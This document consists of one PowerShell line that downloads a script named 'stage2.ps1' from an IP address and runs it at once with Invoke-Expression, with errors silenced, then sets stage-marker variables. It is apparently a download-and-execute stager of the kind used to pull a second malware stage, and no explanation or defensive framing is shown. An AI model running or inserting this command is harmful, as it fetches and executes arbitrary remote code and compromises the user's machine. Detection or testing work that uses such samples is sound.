IEX (Invoke-WebRequest -Uri 'http://192.0.2.185/stage2.ps1' -UseBasicParsing -ErrorAction SilentlyContinue).Content; Write-Verbose "stage marker 43 reached"; $StageMarker = "stage-18"
